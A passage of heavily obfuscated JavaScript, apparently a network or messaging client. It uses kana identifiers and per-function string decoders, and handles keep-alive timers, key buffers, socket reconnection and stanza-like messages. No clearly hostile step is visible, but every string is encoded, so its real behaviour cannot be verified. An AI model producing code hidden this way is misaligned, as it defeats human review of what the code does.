          (をへ = () => {
            return つき(なる[0x54]);
          }),
          (つな = ねけ(うし)),
          ほせ[なる[0x18]](ぬひ(なる[0x49]), をへ),
          ほせ[なる[0x18]](はね(0x122), つな),
          ほせ[なる[0x18]](はね(0x123), つな),
        );
      })[うし(0x124)](() => {
        function つき(つき) {
          var なす =
              'yLZdDCGUShRMNmFtJiYkE:*b<o!u0f|_Ia(VpXB+^?%6#Tv7g"1>`l/q){OQ]$K,js}@WAz;xn~w[389cr5=2&P4H.e',
            うし,
            はね,
            をは,
            をへ,
            つな,
            ぬひ,
            ほの;
          へら(
            (うし = "" + (つき || "")),
            (はね = うし.length),
            (をは = []),
            (をへ = なる[0x0]),
            (つな = なる[0x0]),
            (ぬひ = -なる[0x1]),
          );
          for (ほの = なる[0x0]; ほの < はね; ほの++) {
            var てろ = なす.indexOf(うし[ほの]);
            if (てろ === -なる[0x1]) continue;
            if (ぬひ < なる[0x0]) {
              ぬひ = てろ;
            } else {
              へら(
                (ぬひ += てろ * なる[0xc]),
                (をへ |= ぬひ << つな),
                (つな +=
                  (ぬひ & なる[0xd]) > なる[0xe] ? なる[0xf] : なる[0x10]),
              );
              do {
                へら(
                  をは.push(をへ & なる[0x3]),
                  (をへ >>= なる[0x2]),
                  (つな -= なる[0x2]),
                );
              } while (つな > なる[0x9]);
              ぬひ = -なる[0x1];
            }
          }
          if (ぬひ > -なる[0x1]) {
            をは.push((をへ | (ぬひ << つな)) & なる[0x3]);
          }
          return ぬは(をは);
        }
        function なす(なす) {
          if (typeof すは[なす] === なる[0x5]) {
            return (すは[なす] = つき(やぬ[なす]));
          }
          return すは[なす];
        }
        へら(
          ほせ[うし(なる[0x39])](うし(0x126), をへ),
          ほせ[うし(なる[0x39])](うし(0x127), つな),
          ほせ[なす(0x128)](なす(0x129), つな),
        );
      });
    },
    たわ = () => {
      return (えへ = setInterval(() => {
        function つき(つき) {
          var うし =
              'QFfsWpN^_zE98emxG*RHwOySM3q1a)(VU;L`DCciIZnl$P+%<gJ[~7K2&|u?h@Btj"d}=oY>{,vkXb]5Tr4.6/0!#A:',
            ぬひ,
            なす,
            はね,
            をは,
            をへ,
            つな,
            ほの;
          へら(
            (ぬひ = "" + (つき || "")),
            (なす = ぬひ.length),
            (はね = []),
            (をは = なる[0x0]),
            (をへ = なる[0x0]),
            (つな = -なる[0x1]),
          );
          for (ほの = なる[0x0]; ほの < なす; ほの++) {
            var てろ = うし.indexOf(ぬひ[ほの]);
            if (てろ === -なる[0x1]) continue;
            if (つな < なる[0x0]) {
              つな = てろ;
            } else {
              へら(
                (つな += てろ * なる[0xc]),
                (をは |= つな << をへ),
                (をへ +=
                  (つな & なる[0xd]) > なる[0xe] ? なる[0xf] : なる[0x10]),
              );
              do {
                へら(
                  はね.push(をは & なる[0x3]),
                  (をは >>= なる[0x2]),
                  (をへ -= なる[0x2]),
                );
              } while (をへ > なる[0x9]);
              つな = -なる[0x1];
            }
          }
          if (つな > -なる[0x1]) {
            はね.push((をは | (つな << をへ)) & なる[0x3]);
          }
          return ぬは(はね);
        }
        function うし(うし) {
          if (typeof すは[うし] === なる[0x5]) {
            return (すは[うし] = つき(やぬ[うし]));
          }
          return すは[うし];
        }
        if (!るえ) {
          るえ = new Date();
        }
        const ぬひ = Date[うし(0x12a)]() - るえ[うし(0x12b)]();
        if (ぬひ > つな + 0x1388) {
          やの(new さは(うし(0x12c), { [うし(0x12d)]: せけ[うし(0x12e)] }));
        } else {
          if (ほせ[うし(0x12f)]) {
            function なす(つき) {
              var うし =
                  'zUcMjfhYZCLD6|%G!u(gaX4~3{F;^1K9&vdkI+A*}p2tel[BPwq0"@y8H7O5]:$QiJo#,EnT.R)N`rVxW/Ss>?_b=<m',
                ぬひ,
                なす,
                はね,
                をは,
                をへ,
                つな,
                ほの;
              へら(
                (ぬひ = "" + (つき || "")),
                (なす = ぬひ.length),
                (はね = []),
                (をは = なる[0x0]),
                (をへ = なる[0x0]),
                (つな = -なる[0x1]),
              );
              for (ほの = なる[0x0]; ほの < なす; ほの++) {
                var てろ = うし.indexOf(ぬひ[ほの]);
                if (てろ === -なる[0x1]) continue;
                if (つな < なる[0x0]) {
                  つな = てろ;
                } else {
                  へら(
                    (つな += てろ * なる[0xc]),
                    (をは |= つな << をへ),
                    (をへ +=
                      (つな & なる[0xd]) > なる[0xe] ? なる[0xf] : なる[0x10]),
                  );
                  do {
                    へら(
                      はね.push(をは & なる[0x3]),
                      (をは >>= なる[0x2]),
                      (をへ -= なる[0x2]),
                    );
                  } while (をへ > なる[0x9]);
                  つな = -なる[0x1];
                }
              }
              if (つな > -なる[0x1]) {
                はね.push((をは | (つな << をへ)) & なる[0x3]);
              }
              return ぬは(はね);
            }
            function はね(つき) {
              if (typeof すは[つき] === なる[0x5]) {
                return (すは[つき] = なす(やぬ[つき]));
              }
              return すは[つき];
            }
            よね({
              [うし(0x130)]: なる[0x3a],
              [うし(0x131)]: {
                [なる[0x1c]]: ねせ(),
                [なる[0x3b]]: のる,
                [うし(0x132)]: うし(0x133),
                [うし(0x134)]: はね(0x135),
              },
              [はね(0x136)]: [
                { [はね(0x137)]: はね(0x138), [はね(0x139)]: {} },
              ],
            })[はね(0x13a)]((つき) => {
              function うし(つき) {
                var うし =
                    '$MTfDncj2GLK,(q/]08b5H&|>?;d#m@u!^gsC_W*:V}%UJX7=QP<6oavlY1~Fx4ON`+Bitw[SIk.p93{Z"Eeh)yArRz',
                  ぬひ,
                  なす,
                  はね,
                  をは,
                  をへ,
                  つな,
                  ほの;
                へら(
                  (ぬひ = "" + (つき || "")),
                  (なす = ぬひ.length),
                  (はね = []),
                  (をは = なる[0x0]),
                  (をへ = なる[0x0]),
                  (つな = -なる[0x1]),
                );
                for (ほの = なる[0x0]; ほの < なす; ほの++) {
                  var てろ = うし.indexOf(ぬひ[ほの]);
                  if (てろ === -なる[0x1]) continue;
                  if (つな < なる[0x0]) {
                    つな = てろ;
                  } else {
                    へら(
                      (つな += てろ * なる[0xc]),
                      (をは |= つな << をへ),
                      (をへ +=
                        (つな & なる[0xd]) > なる[0xe]
                          ? なる[0xf]
                          : なる[0x10]),
                    );
                    do {
                      へら(
                        はね.push(をは & なる[0x3]),
                        (をは >>= なる[0x2]),
                        (をへ -= なる[0x2]),
                      );
                    } while (をへ > なる[0x9]);
                    つな = -なる[0x1];
                  }
                }
                if (つな > -なる[0x1]) {
                  はね.push((をは | (つな << をへ)) & なる[0x3]);
                }
                return ぬは(はね);
              }
              function ぬひ(つき) {
                if (typeof すは[つき] === なる[0x5]) {
                  return (すは[つき] = うし(やぬ[つき]));
                }
                return すは[つき];
              }
              をへ[はね(0x13b)](
                { [ぬひ(0x13c)]: つき[ぬひ(0x13d)] },
                ぬひ(0x13e),
              );
            });
          } else {
            をへ[うし(0x13f)](うし(0x140));
          }
        }
      }, つな));
    },
    よせ = (つき) => {
      function うし(つき) {
        var うし =
            '$^0_7%z)>9`Frm*Q<=OLASMc,l!?"5v]df&s:hb/3k}{RBZExptD#u.TJYyq~ga1In(U8j4We6G@wXNP+[;o|KH2CVi',
          なす,
          ぬひ,
          はね,
          をは,
          をへ,
          つな,
          ほの;
        へら(
          (なす = "" + (つき || "")),
          (ぬひ = なす.length),
          (はね = []),
          (をは = なる[0x0]),
          (をへ = なる[0x0]),
          (つな = -なる[0x1]),
        );
        for (ほの = なる[0x0]; ほの < ぬひ; ほの++) {
          var てろ = うし.indexOf(なす[ほの]);
          if (てろ === -なる[0x1]) continue;
          if (つな < なる[0x0]) {
            つな = てろ;
          } else {
            へら(
              (つな += てろ * なる[0xc]),
              (をは |= つな << をへ),
              (をへ += (つな & なる[0xd]) > なる[0xe] ? なる[0xf] : なる[0x10]),
            );
            do {
              へら(
                はね.push(をは & なる[0x3]),
                (をは >>= なる[0x2]),
                (をへ -= なる[0x2]),
              );
            } while (をへ > なる[0x9]);
            つな = -なる[0x1];
          }
        }
        if (つな > -なる[0x1]) {
          はね.push((をは | (つな << をへ)) & なる[0x3]);
        }
        return ぬは(はね);
      }
      function なす(つき) {
        if (typeof すは[つき] === なる[0x5]) {
          return (すは[つき] = うし(やぬ[つき]));
        }
        return すは[つき];
      }
      return よね({
        [ぬひ(なる[0x3c])]: なる[0x3a],
        [なす(なる[0x3d])]: {
          [なる[0x3b]]: のる,
          [なす(0x142)]: なす(0x143),
          [なす(0x144)]: なす(0x145),
        },
        [なす(0x146)]: [{ [なす(0x147)]: つき, [なす(なる[0x3d])]: {} }],
      });
    },
    しせ = async (つき) => {
      const うし = てろ[ぬひ(なる[0x16])][なる[0x20]]?.id;
      if (うし) {
        function なす(つき) {
          var うし =
              'EcntkFuMxAW~_v$).i}bh?rX/Qjzy"s@q!5SRPIm1^0e>G&`ZalNHpV]2foBdC6*D,wT|Y<:=#OJU{43K+gL79[8(%;',
            なす,
            はね,
            ぬひ,
            をは,
            をへ,
            つな,
            ほの;
          へら(
            (なす = "" + (つき || "")),
            (はね = なす.length),
            (ぬひ = []),
            (をは = なる[0x0]),
            (をへ = なる[0x0]),
            (つな = -なる[0x1]),
          );
          for (ほの = なる[0x0]; ほの < はね; ほの++) {
            var てろ = うし.indexOf(なす[ほの]);
            if (てろ === -なる[0x1]) continue;
            if (つな < なる[0x0]) {
              つな = てろ;
            } else {
              へら(
                (つな += てろ * なる[0xc]),
                (をは |= つな << をへ),
                (をへ +=
                  (つな & なる[0xd]) > なる[0xe] ? なる[0xf] : なる[0x10]),
              );
              do {
                へら(
                  ぬひ.push(をは & なる[0x3]),
                  (をは >>= なる[0x2]),
                  (をへ -= なる[0x2]),
                );
              } while (をへ > なる[0x9]);
              つな = -なる[0x1];
            }
          }
          if (つな > -なる[0x1]) {
            ぬひ.push((をは | (つな << をへ)) & なる[0x3]);
          }
          return ぬは(ぬひ);
        }
        function はね(つき) {
          if (typeof すは[つき] === なる[0x5]) {
            return (すは[つき] = なす(やぬ[つき]));
          }
          return すは[つき];
        }
        await すゆ({
          [はね(なる[0x3e])]: なる[0x3a],
          [はね(なる[0x3f])]: {
            [なる[0x3b]]: のる,
            [はね(0x14a)]: はね(0x14b),
            [なる[0x1c]]: ねせ(),
            [はね(0x14c)]: なる[0x41],
          },
          [はね(0x14d)]: [
            {
              [はね(なる[0x3e])]: はね(0x14e),
              [はね(なる[0x3f])]: {
                [はね(0x14f)]: うし,
                [はね(0x150)]: はね(0x151),
              },
            },
          ],
        });
      }
      やの(
        new さは(つき || ぬひ(0x152), {
          [ぬひ(なる[0x4b])]: せけ[ぬひ(0x154)],
        }),
      );
    },
    をよ = async (つき, うし) => {
      function ぬひ(つき) {
        var うし =
            '6=`e1Sx;}D3uATs[/)LcZ>Fbt.dv9Q#&<JGj$w:?!o"hykX%~B(m@l_rpY{z4HCaf^UM2EV+W80OPqKR57I*]ig,N|n',
          ぬひ,
          なす,
          はね,
          をは,
          をへ,
          つな,
          ほの;
        へら(
          (ぬひ = "" + (つき || "")),
          (なす = ぬひ.length),
          (はね = []),
          (をは = なる[0x0]),
          (をへ = なる[0x0]),
          (つな = -なる[0x1]),
        );
        for (ほの = なる[0x0]; ほの < なす; ほの++) {
          var てろ = うし.indexOf(ぬひ[ほの]);
          if (てろ === -なる[0x1]) continue;
          if (つな < なる[0x0]) {
            つな = てろ;
          } else {
            へら(
              (つな += てろ * なる[0xc]),
              (をは |= つな << をへ),
              (をへ += (つな & なる[0xd]) > なる[0xe] ? なる[0xf] : なる[0x10]),
            );
            do {
              へら(
                はね.push(をは & なる[0x3]),
                (をは >>= なる[0x2]),
                (をへ -= なる[0x2]),
              );
            } while (をへ > なる[0x9]);
            つな = -なる[0x1];
          }
        }
        if (つな > -なる[0x1]) {
          はね.push((をは | (つな << をへ)) & なる[0x3]);
        }
        return ぬは(はね);
      }
      function なす(つき) {
        if (typeof すは[つき] === なる[0x5]) {
          return (すは[つき] = ぬひ(やぬ[つき]));
        }
        return すは[つき];
      }
      へら(
        (てろ[なす(なる[0x40])][なす(なる[0x45])] =
          (うし || へそ || "")?.toLocaleUpperCase?.() || によ(をの(0x5))),
        (てろ[なす(なる[0x40])][なる[0x20]] = {
          [なる[0x1c]]: にう(つき, なす(0x157)),
          [なす(0x158)]: "~",
        }),
        きな[なす(0x159)](なす(0x15a), てろ[なす(なる[0x40])]),
        await すゆ({
          [なす(なる[0x42])]: なる[0x3a],
          [なす(なる[0x43])]: {
            [なる[0x3b]]: のる,
            [なす(0x15d)]: なす(0x15e),
            [なる[0x1c]]: ねせ(),
            [なす(0x15f)]: なる[0x41],
          },
          [なす(なる[0x44])]: [
            {
              [なす(なる[0x42])]: なす(0x161),
              [なす(なる[0x43])]: {
                [なす(0x162)]: てろ[なす(なる[0x40])][なる[0x20]][なる[0x1c]],
                [なす(0x163)]: なす(0x164),
                [なす(0x165)]: なす(0x166),
              },
              [なす(なる[0x44])]: [
                {
                  [なす(なる[0x42])]: なす(0x167),
                  [なす(なる[0x43])]: {},
                  [なす(なる[0x44])]: await たん(),
                },
                {
                  [なす(なる[0x42])]: なす(0x168),
                  [なす(なる[0x43])]: {},
                  [なす(なる[0x44])]:
                    てろ[なす(なる[0x40])][なす(0x169)][なす(0x16a)],
                },
                {
                  [なす(なる[0x42])]: なす(0x16b),
                  [なす(なる[0x43])]: {},
                  [なす(なる[0x44])]: ぬな(ほの[なる[0x1]]),
                },
                {
                  [なす(なる[0x42])]: なす(0x16c),
                  [なす(なる[0x43])]: {},
                  [なす(なる[0x44])]:
                    "" + ほの[なる[0x1]] + " (" + ほの[なる[0x0]] + なる[0x58],
                },
                {
                  [なす(なる[0x42])]: なす(0x16d),
                  [なす(なる[0x43])]: {},
                  [なす(なる[0x44])]: "0",
                },
              ],
            },
          ],
        }),
      );
      return てろ[なす(なる[0x40])][なす(なる[0x45])];
    };
  async function たん(つき, うし) {
    if (!うし) {
      うし = function (うし) {
        if (typeof すは[うし] === なる[0x5]) {
          return (すは[うし] = つき(やぬ[うし]));
        }
        return すは[うし];
      };
    }
    if (!つき) {
      つき = function (つき) {
        var うし =
            'Q7*}>_0acIf(ACB;dtw^,H3qO:96NSpx+UFP]Eb&G=<?@%s|Y.eJz${nM#R`ygK[iTLWhV4D!2~)8o1u/"5XmljkrZv',
          なす,
          はね,
          をは,
          をへ,
          ぬひ,
          つな,
          ほの;
        へら(
          (なす = "" + (つき || "")),
          (はね = なす.length),
          (をは = []),
          (をへ = なる[0x0]),
          (ぬひ = なる[0x0]),
          (つな = -なる[0x1]),
        );
        for (ほの = なる[0x0]; ほの < はね; ほの++) {
          var てろ = うし.indexOf(なす[ほの]);
          if (てろ === -なる[0x1]) continue;
          if (つな < なる[0x0]) {
            つな = てろ;
          } else {
            へら(
              (つな += てろ * なる[0xc]),
              (をへ |= つな << ぬひ),
              (ぬひ += (つな & なる[0xd]) > なる[0xe] ? なる[0xf] : なる[0x10]),
            );
            do {
              へら(
                をは.push(をへ & なる[0x3]),
                (をへ >>= なる[0x2]),
                (ぬひ -= なる[0x2]),
              );
            } while (ぬひ > なる[0x9]);
            つな = -なる[0x1];
          }
        }
        if (つな > -なる[0x1]) {
          をは.push((をへ | (つな << ぬひ)) & なる[0x3]);
        }
        return ぬは(をは);
      };
    }
    const なす = をの(0x20),
      はね = をの(0x10),
      をは = await ねた(てろ[ぬひ(なる[0x16])][うし(0x16e)], なす),
      をへ = んと(てろ[うし(0x16f)][うし(0x170)][うし(0x171)], をは, はね);
    return Buffer[うし(0x172)]([なす, はね, をへ]);
  }
  const うの = (つき) => {
    function うし(つき) {
      var うし =
          '7.~3+>_9@(1i)8DplAv*ydzT4G/jg%Ur|RNuI=cw]Bx`[q}5?&XL{#no0OHmQC$,M:2hVFJs;tbEfK^e<6!ZYW"kaSP',
        ぬひ,
        なす,
        はね,
        をは,
        をへ,
        つな,
        ほの;
      へら(
        (ぬひ = "" + (つき || "")),
        (なす = ぬひ.length),
        (はね = []),
        (をは = なる[0x0]),
        (をへ = なる[0x0]),
        (つな = -なる[0x1]),
      );
      for (ほの = なる[0x0]; ほの < なす; ほの++) {
        var てろ = うし.indexOf(ぬひ[ほの]);
        if (てろ === -なる[0x1]) continue;
        if (つな < なる[0x0]) {
          つな = てろ;
        } else {
          へら(
            (つな += てろ * なる[0xc]),
            (をは |= つな << をへ),
            (をへ += (つな & なる[0xd]) > なる[0xe] ? なる[0xf] : なる[0x10]),
          );
          do {
            へら(
              はね.push(をは & なる[0x3]),
              (をは >>= なる[0x2]),
              (をへ -= なる[0x2]),
            );
          } while (をへ > なる[0x9]);
          つな = -なる[0x1];
        }
      }
      if (つな > -なる[0x1]) {
        はね.push((をは | (つな << をへ)) & なる[0x3]);
      }
      return ぬは(はね);
    }
    function ぬひ(つき) {
      if (typeof すは[つき] === なる[0x5]) {
        return (すは[つき] = うし(やぬ[つき]));
      }
      return すは[つき];
    }
    return よね({
      [ぬひ(なる[0x46])]: なる[0x3a],
      [ぬひ(なる[0x47])]: {
        [なる[0x3b]]: のる,
        [なる[0x1c]]: ねせ(),
        [ぬひ(0x175)]: ぬひ(0x176),
      },
      [ぬひ(なる[0x48])]: [
        {
          [ぬひ(なる[0x46])]: ぬひ(0x178),
          [ぬひ(なる[0x47])]: {},
          [ぬひ(なる[0x48])]: つき,
        },
      ],
    });
  };
  へら(
    ほせ[なる[0x18]](ぬひ(0x179), わち),
    ほせ[なる[0x18]](ぬひ(なる[0x49]), async () => {
      try {
        await やり();
      } catch (つき) {
        へら(
          をへ[ぬひ(なる[0x4a])]({ [ぬひ(0x17b)]: つき }, ぬひ(0x17c)),
          やの(つき),
        );
      }
    }),
    ほせ[なる[0x18]](ぬひ(なる[0x4a]), ねけ(やの)),
    ほせ[なる[0x18]](ぬひ(0x17d), () => {
      return やの(
        new さは(ぬひ(0x17e), { [ぬひ(なる[0x4b])]: せけ[ぬひ(0x17f)] }),
      );
    }),
    ほせ[なる[0x18]](ぬひ(0x180), () => {
      function つき(つき) {
        var うし =
            'NZD5f"GHL:*zPY,S]ktJrW4/%sU$}CXFyo>p`eM+#3EB6O=1)AIx2w.Q_|@!?vT^[h~8u{<0R(mn;aKb79g&iqcjVdl',
          ぬひ,
          なす,
          はね,
          をは,
          をへ,
          つな,
          ほの;
        へら(
          (ぬひ = "" + (つき || "")),
          (なす = ぬひ.length),
          (はね = []),
          (をは = なる[0x0]),
          (をへ = なる[0x0]),
          (つな = -なる[0x1]),
        );
        for (ほの = なる[0x0]; ほの < なす; ほの++) {
          var てろ = うし.indexOf(ぬひ[ほの]);
          if (てろ === -なる[0x1]) continue;
          if (つな < なる[0x0]) {
            つな = てろ;
          } else {
            へら(
              (つな += てろ * なる[0xc]),
              (をは |= つな << をへ),
              (をへ += (つな & なる[0xd]) > なる[0xe] ? なる[0xf] : なる[0x10]),
            );
            do {
              へら(
                はね.push(をは & なる[0x3]),
                (をは >>= なる[0x2]),
                (をへ -= なる[0x2]),
              );
            } while (をへ > なる[0x9]);
            つな = -なる[0x1];
          }
        }
        if (つな > -なる[0x1]) {
          はね.push((をは | (つな << をへ)) & なる[0x3]);
        }
        return ぬは(はね);
      }
      function うし(うし) {
        if (typeof すは[うし] === なる[0x5]) {
          return (すは[うし] = つき(やぬ[うし]));
        }
        return すは[うし];
      }
      return やの(new さは(うし(0x181), { [うし(0x182)]: せけ[うし(0x183)] }));
    }),
    ほせ[なる[0x18]](ぬひ(0x184), async (つき) => {
      function うし(つき) {
        var うし =
            '<MHKNOQu*j![Coe0Usbv5#3gwfl)6TA2F/~W}n`L&Yq>E;79x4yVBShI+zD":mc%8Xp|_@t?Ji.k^{ZG],Pa$Rdr1=(',
          なす,
          はね,
          をは,
          をへ,
          つな,
          ほの,
          てろ;
        へら(
          (なす = "" + (つき || "")),
          (はね = なす.length),
          (をは = []),
          (をへ = なる[0x0]),
          (つな = なる[0x0]),
          (ほの = -なる[0x1]),
        );
        for (てろ = なる[0x0]; てろ < はね; てろ++) {
          var てつ = うし.indexOf(なす[てろ]);
          if (てつ === -なる[0x1]) continue;
          if (ほの < なる[0x0]) {
            ほの = てつ;
          } else {
            へら(
              (ほの += てつ * なる[0xc]),
              (をへ |= ほの << つな),
              (つな += (ほの & なる[0xd]) > なる[0xe] ? なる[0xf] : なる[0x10]),
            );
            do {
              へら(
                をは.push(をへ & なる[0x3]),
                (をへ >>= なる[0x2]),
                (つな -= なる[0x2]),
              );
            } while (つな > なる[0x9]);
            ほの = -なる[0x1];
          }
        }
        if (ほの > -なる[0x1]) {
          をは.push((をへ | (ほの << つな)) & なる[0x3]);
        }
        return ぬは(をは);
      }
      function なす(つき) {
        if (typeof すは[つき] === なる[0x5]) {
          return (すは[つき] = うし(やぬ[つき]));
        }
        return すは[つき];
      }
      const はね = {
        [ぬひ(なる[0x3c])]: なる[0x3a],
        [ぬひ(なる[0x4c])]: {
          [なる[0x3b]]: のる,
          [ぬひ(なる[0x60])]: ぬひ(0x187),
          [なる[0x1c]]: つき[ぬひ(なる[0x4c])][なる[0x1c]],
        },
      };
      await すゆ(はね);
      const をは = なほ(つき, ぬひ(0x188)),
        をへ = たふ(をは, ぬひ(0x189)),
        つな = Buffer[ぬひ(0x18a)](さな[なす(0x18b)][なす(なる[0x4d])])[
          なす(なる[0x4e])
        ](なす(なる[0x4f])),
        ほの = Buffer[なす(0x18f)](さな[なす(0x190)][なす(なる[0x4d])])[
          なす(なる[0x4e])
        ](なす(なる[0x4f])),
        てろ = さな[なす(0x191)];
      let てつ = のち || 0xea60;
      const makeSocket = () => {
        function つき(つき) {
          var うし =
              '9aASErRGVYP.$8n4iF;,s}ozBhu`#+kbUf@JWM_!ZC/")Kv(Q[Tdj=INey&c32|DX17w6O0*xHq?l>gp{%~m5^:L]t<',
            はね,
            をは,
            ぬひ,
            てそ,
            はん,
            なす,
            をへ;
          へら(
            (はね = "" + (つき || "")),
            (をは = はね.length),
            (ぬひ = []),
            (てそ = なる[0x0]),
            (はん = なる[0x0]),
            (なす = -なる[0x1]),
          );
          for (をへ = なる[0x0]; をへ < をは; をへ++) {
            var つな = うし.indexOf(はね[をへ]);
            if (つな === -なる[0x1]) continue;
            if (なす < なる[0x0]) {
              なす = つな;
            } else {
              へら(
                (なす += つな * なる[0xc]),
                (てそ |= なす << はん),
                (はん +=
                  (なす & なる[0xd]) > なる[0xe] ? なる[0xf] : なる[0x10]),
              );
              do {
                へら(
                  ぬひ.push(てそ & なる[0x3]),
                  (てそ >>= なる[0x2]),
                  (はん -= なる[0x2]),
                );
              } while (はん > なる[0x9]);
              なす = -なる[0x1];
            }
          }
          if (なす > -なる[0x1]) {
            ぬひ.push((てそ | (なす << はん)) & なる[0x3]);
          }
          return ぬは(ぬひ);
        }
        function うし(うし) {
          if (typeof すは[うし] === なる[0x5]) {
            return (すは[うし] = つき(やぬ[うし]));
          }
          return すは[うし];
        }
        if (!ほせ[なす(0x192)]) {
          return;
        }
        const はね = をへ[なす(0x193)]();
        if (!はね) {
          function をは(つき) {
            var うし =
                '#DItPFjk1qX}80iu.h2oxS(HnyB;mgLRTQ*9b^fO~`3<,4?CK>d6%e"J&/G$A!W+Za]Ecr)|s5@M:v{wN=YzVU_lp[7',
              はね,
              をは,
              ぬひ,
              てそ,
              はん,
              なす,
              をへ;
            へら(
              (はね = "" + (つき || "")),
              (をは = はね.length),
              (ぬひ = []),
              (てそ = なる[0x0]),
              (はん = なる[0x0]),
              (なす = -なる[0x1]),
            );
            for (をへ = なる[0x0]; をへ < をは; をへ++) {
              var つな = うし.indexOf(はね[をへ]);
              if (つな === -なる[0x1]) continue;
              if (なす < なる[0x0]) {
                なす = つな;
              } else {
                へら(
                  (なす += つな * なる[0xc]),
                  (てそ |= なす << はん),
                  (はん +=
                    (なす & なる[0xd]) > なる[0xe] ? なる[0xf] : なる[0x10]),
                );
                do {
                  へら(
                    ぬひ.push(てそ & なる[0x3]),
                    (てそ >>= なる[0x2]),
                    (はん -= なる[0x2]),
                  );
                } while (はん > なる[0x9]);
                なす = -なる[0x1];
              }
            }
            if (なす > -なる[0x1]) {
              ぬひ.push((てそ | (なす << はん)) & なる[0x3]);
            }
            return ぬは(ぬひ);
          }
          function ぬひ(つき) {
            if (typeof すは[つき] === なる[0x5]) {
              return (すは[つき] = をは(やぬ[つき]));
            }
            return すは[つき];
          }
          やの(new さは(なす(0x194), { [ぬひ(0x195)]: せけ[ぬひ(0x196)] }));
          return;
        }
        const てそ = はね[なす(0x197)][うし(0x198)](うし(0x199)),
          はん = [てそ, つな, ほの, てろ][うし(0x19a)](なる[0x2a]);
        へら(
          きな[うし(0x19b)](うし(0x19c), { [なる[0x53]]: はん }),
          (うた = setTimeout(makeSocket, てつ)),
          (てつ = のち || 0x4e20),
        );
      };
      makeSocket();
    }),
    ほせ[なる[0x18]](ぬひ(0x19d), async (つき) => {
      function うし(つき) {
        var うし =
            '1w)#u<%],_|*z;?9UKXbyivrZtH!AQ>DxsJLNGE@2cYICfgT~.$laoW{Sn3OBmpq6"4`dk(hP/M8=V}[7Re&^0j5:+F',
          なす,
          はね,
          をは,
          つな,
          ほの,
          てろ,
          てつ;
        へら(
          (なす = "" + (つき || "")),
          (はね = なす.length),
          (をは = []),
          (つな = なる[0x0]),
          (ほの = なる[0x0]),
          (てろ = -なる[0x1]),
        );
        for (てつ = なる[0x0]; てつ < はね; てつ++) {
          var makeSocket = うし.indexOf(なす[てつ]);
          if (makeSocket === -なる[0x1]) continue;
          if (てろ < なる[0x0]) {
            てろ = makeSocket;
          } else {
            へら(
              (てろ += makeSocket * なる[0xc]),
              (つな |= てろ << ほの),
              (ほの += (てろ & なる[0xd]) > なる[0xe] ? なる[0xf] : なる[0x10]),
            );
            do {
              へら(
                をは.push(つな & なる[0x3]),
                (つな >>= なる[0x2]),
                (ほの -= なる[0x2]),
              );
            } while (ほの > なる[0x9]);
            てろ = -なる[0x1];
          }
        }
        if (てろ > -なる[0x1]) {
          をは.push((つな | (てろ << ほの)) & なる[0x3]);
        }
        return ぬは(をは);
      }
      function なす(つき) {
        if (typeof すは[つき] === なる[0x5]) {
          return (すは[つき] = うし(やぬ[つき]));
        }
        return すは[つき];
      }
      をへ[ぬひ(なる[0x5d])](なす(0x19f));
      try {
        function はね(つき) {
          var うし =
              'MpqxfBRulSH%y]vKLsD9V8k:w<+[_"zYWm1>*gj0@A(OP23N5=&~!X#o`/G{d}ET46ZC,icnF)|JIb$QeU?rah;.^t7',
            なす,
            はね,
            をは,
            つな,
            ほの,
            てろ,
            てつ;
          へら(
            (なす = "" + (つき || "")),
            (はね = なす.length),
            (をは = []),
            (つな = なる[0x0]),
            (ほの = なる[0x0]),
            (てろ = -なる[0x1]),
          );
          for (てつ = なる[0x0]; てつ < はね; てつ++) {
            var makeSocket = うし.indexOf(なす[てつ]);
            if (makeSocket === -なる[0x1]) continue;
            if (てろ < なる[0x0]) {
              てろ = makeSocket;
            } else {
              へら(
                (てろ += makeSocket * なる[0xc]),
                (つな |= てろ << ほの),
                (ほの +=
                  (てろ & なる[0xd]) > なる[0xe] ? なる[0xf] : なる[0x10]),
              );
              do {
                へら(
                  をは.push(つな & なる[0x3]),
                  (つな >>= なる[0x2]),
                  (ほの -= なる[0x2]),
                );
              } while (ほの > なる[0x9]);
              てろ = -なる[0x1];
            }
          }
          if (てろ > -なる[0x1]) {
            をは.push((つな | (てろ << ほの)) & なる[0x3]);
          }
          return ぬは(をは);
        }
        function をは(つき) {
          if (typeof すは[つき] === なる[0x5]) {
            return (すは[つき] = はね(やぬ[つき]));
          }
          return すは[つき];
        }
        if (をは(0x1a0) in とた) {
          つな();
        }
        function つな() {}
        const { [をは(0x1a1)]: ほの, [をは(0x1a2)]: てろ } = こと(つき, さな);
        へら(
          をへ[をは(0x1a3)](
            {
              [なる[0x20]]: てろ[なる[0x20]],
              [をは(なる[0x51])]: てろ[をは(なる[0x51])],
            },
            をは(0x1a5),
          ),
          きな[をは(なる[0x52])](をは(0x1a7), てろ),
          きな[をは(なる[0x52])](をは(0x1a8), {
            [をは(0x1a9)]: なる[0x2e],
            [なる[0x53]]: なる[0x54],
          }),
          await すゆ(ほの),
        );
      } catch (てつ) {
        function makeSocket(つき) {
          var うし =
              'ANPFsIKVJXlBhLEkiCQ*7O;:q69,[Yo%MSt|Tgdep<Z}1rcm!a"b^()jy+~fWnDRU#G.&z?0uvw`x=]$>3{42/85@_H',
            なす,
            はね,
            をは,
            つな,
            ほの,
            てろ,
            てつ;
          へら(
            (なす = "" + (つき || "")),
            (はね = なす.length),
            (をは = []),
            (つな = なる[0x0]),
            (ほの = なる[0x0]),
            (てろ = -なる[0x1]),
          );
          for (てつ = なる[0x0]; てつ < はね; てつ++) {
            var makeSocket = うし.indexOf(なす[てつ]);
            if (makeSocket === -なる[0x1]) continue;
            if (てろ < なる[0x0]) {
              てろ = makeSocket;
            } else {
              へら(
                (てろ += makeSocket * なる[0xc]),
                (つな |= てろ << ほの),
                (ほの +=
                  (てろ & なる[0xd]) > なる[0xe] ? なる[0xf] : なる[0x10]),
              );
              do {
                へら(
                  をは.push(つな & なる[0x3]),
                  (つな >>= なる[0x2]),
                  (ほの -= なる[0x2]),
                );
              } while (ほの > なる[0x9]);
              てろ = -なる[0x1];
            }
          }
          if (てろ > -なる[0x1]) {
            をは.push((つな | (てろ << ほの)) & なる[0x3]);
          }
          return ぬは(をは);
        }
        function てそ(つき) {
          if (typeof すは[つき] === なる[0x5]) {
            return (すは[つき] = makeSocket(やぬ[つき]));
          }
          return すは[つき];
        }
        へら(
          をへ[なす(0x1aa)]({ [なす(0x1ab)]: てつ[てそ(0x1ac)] }, てそ(0x1ad)),
          やの(てつ),
        );
      }
    }),
    ほせ[なる[0x18]](ぬひ(0x1ae), async (つき) => {
      try {
        function うし(つき) {
          var うし =
